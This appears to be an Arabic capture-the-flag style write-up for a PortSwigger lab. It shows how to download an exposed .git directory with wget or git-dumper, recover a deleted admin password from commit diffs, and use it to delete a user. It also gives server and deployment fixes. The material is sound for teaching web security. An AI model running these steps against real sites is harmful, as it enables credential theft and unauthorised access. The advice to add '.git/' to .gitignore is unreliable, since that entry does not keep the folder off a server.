# Lab: Information disclosure in version control history

> **Category:** Information Disclosure  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/lab-information-disclosure-in-version-control-history)

---

## 🎯 الهدف الرئيسي

استغلال وجود مجلد `.git/` على الخادم، والذي يكشف تاريخ التحكم في الإصدارات (version control history). من خلال تحليل الـ commits، يمكننا العثور على كلمة مرور المسؤول (administrator) التي تمت إزالتها في commit لاحق ولكنها لا تزال موجودة في تاريخ المشروع.

**المطلوب:** استخراج كلمة مرور المسؤول، تسجيل الدخول، وحذف المستخدم `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: اكتشاف مجلد .git

- افتح المختبر في المتصفح
- أضف `/.git/` إلى الرابط:

```
https://YOUR-LAB-ID.web-security-academy.net/.git/
```

**النتيجة:** تظهر قائمة الملفات (أو رسالة تفيد بوجود المجلد).

### الخطوة 2: تحميل مجلد .git بالكامل

**للمستخدمين الذين يستخدمون Linux/Mac (مع wget):**

```bash
wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
```

**للمستخدمين الذين يستخدمون Windows (بديل):**

```bash
git clone https://YOUR-LAB-ID.web-security-academy.net/.git/
```

أو استخدم أداة `git-dumper`:

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip install -r requirements.txt
python git_dumper.py https://YOUR-LAB-ID.web-security-academy.net/.git/ ./repo
```

### الخطوة 3: استكشاف سجل الـ Git

- انتقل إلى المجلد المحمل:

```bash
cd YOUR-LAB-ID.web-security-academy.net/.git
# أو
cd repo
```

- عرض سجل الـ commits:

```bash
git log --oneline
```

**النتيجة:** ستجد commit مشابه لهذا:

```
3a2b1c4 Remove admin password from config
2b3c4d5 Initial commit with admin config
```

### الخطوة 4: عرض التفاصيل الكاملة للـ commit

```bash
git show 3a2b1c4
```

أو (لعرض الفرق بين commits):

```bash
git diff 2b3c4d5 3a2b1c4
```

**النتيجة:** سترى شيئاً مشابهاً لهذا:

```diff
diff --git a/admin.conf b/admin.conf
index abc123..def456 100644
--- a/admin.conf
+++ b/admin.conf
@@ -1,2 +1,2 @@
-ADMIN_PASSWORD=superSecretPassword123
+ADMIN_PASSWORD=${ADMIN_PASSWORD}
```

**المعلومة المطلوبة:** `superSecretPassword123` (أي كلمة المرور التي تظهر في الـ diff)

### الخطوة 5: تسجيل الدخول كـ administrator

- ارجع إلى المختبر
- سجل الدخول باستخدام:
  - **Username:** `administrator`
  - **Password:** `superSecretPassword123` (كلمة المرور التي وجدتها)

### الخطوة 6: حذف المستخدم carlos

- بعد تسجيل الدخول، اذهب إلى `/admin`
- اضغط على زر **Delete** بجانب `carlos`

### الخطوة 7: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو مجلد .git؟** | مجلد يخزن تاريخ التحكم في الإصدارات (commits, branches, diffs) |
| **لماذا هذا خطير؟** | يحتوي على تاريخ كامل للمشروع، بما في ذلك الكلمات المرور التي تمت إزالتها لاحقاً |
| **كيف نستغلها؟** | نحمّل المجلد ونبحث في الـ commits السابقة عن معلومات حساسة |
| **ماذا نبحث عنه؟** | كلمات مرور، مفاتيح API، توكنات، أو أي معلومات حساسة أخرى |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

وجود مجلد `.git/` على خادم الإنتاج (production)، مما يكشف تاريخ المشروع بالكامل، بما في ذلك الكلمات المرور والبيانات الحساسة التي تمت إزالتها في commits لاحقة.

---

### ❌ Non-Compliant Code (Configuration)

```nginx
# إعدادات Nginx - لا تمنع الوصول إلى مجلد .git
location / {
    try_files $uri $uri/ =404;
}
# .git قابل للوصول!
```

```bash
# خطأ: رفع مجلد .git إلى الخادم
git push production main
# مجلد .git موجود على الخادم
```

```javascript
// admin.conf - كلمة مرور مكتوبة بشكل ثابت في الكود
// خطأ: كلمة المرور في تاريخ Git
ADMIN_PASSWORD = "superSecretPassword123";
```

---

### ✅ Compliant Code (Configuration)

```nginx
# إعدادات Nginx - منع الوصول إلى مجلد .git
location ~ /\.git {
    deny all;
    return 403;
}
```

```bash
# .gitignore - منع رفع مجلد .git إلى الخادم
# إضافة إلى .gitignore
.git/
*.log
.env
*.bak

# عند النشر، استخدم excluded paths
rsync -av --exclude='.git' ./ user@server:/var/www/
```

```javascript
// إصلاح: استخدام متغيرات البيئة
// admin.conf - لا توجد كلمة مرور في الكود
ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

// .env.production - يخزن محلياً فقط
ADMIN_PASSWORD=superSecretPassword123
```

```bash
# إصلاح: استخدم CI/CD لإزالة .git تلقائياً
# في pipeline النشر
- rm -rf .git
- rsync -av ./ user@server:/var/www/
```

**الخلاصة:** 
1. امنع الوصول إلى مجلد `.git` عبر إعدادات الخادم
2. لا ترفع مجلد `.git` إلى خادم الإنتاج
3. استخدم متغيرات البيئة لكلمات المرور (ليس في الكود)
4. أزل تاريخ Git من خادم الإنتاج

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **منع الوصول إلى .git:** استخدم قواعد Nginx/Apache لرفض الوصول إلى أي مسار يحتوي على `.git`.
2. **لا ترفع .git إلى الإنتاج:** استخدم `.gitignore` أو `rsync --exclude` لمنع رفع المجلد.
3. **استخدم متغيرات البيئة:** لا تضع كلمات المرور في الكود المصدري.
4. **نظف تاريخ Git:** إذا تم رفع كلمة مرور عن طريق الخطأ، استخدم `git filter-branch` أو `BFG Repo-Cleaner` لإزالتها من التاريخ بالكامل.
5. **استخدم CI/CD pipeline:** قم بإزالة ملفات Git تلقائياً عند النشر.

---



## 📊 ملخص لابات Information Disclosure

| # | اللاب | نوع المعلومات المسربة | طريقة الاستغلال |
|---|-------|---------------------|----------------|
| 01 | Information disclosure in error messages | رقم إصدار الإطار (framework version) | إرسال بيانات غير متوقعة (string بدلاً من int) لظهور stack trace |
| 02 | Information disclosure on debug page | `SECRET_KEY` ومتغيرات البيئة | البحث في تعليقات HTML عن `/cgi-bin/phpinfo.php` |
| 03 | Source code disclosure via backup files | كلمة مرور قاعدة البيانات | اكتشاف `/backup` في `robots.txt` وتحميل ملف `.java.bak` |
| 04 | Authentication bypass via information disclosure | هيدر `X-Custom-IP-Authorization` | استخدام طريقة `TRACE` لاكتشاف الهيدر ثم تزويره |
| 05 | Information disclosure in version control history | كلمة مرور المسؤول (administrator) | تحميل مجلد `.git` وتحليل history باستخدام `git log` و `git diff` |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/information-disclosure/lab-information-disclosure-in-version-control-history)
- [Git Dumper Tool](https://github.com/arthaud/git-dumper)
- [Information Disclosure Cheat Sheet](https://portswigger.net/web-security/information-disclosure)
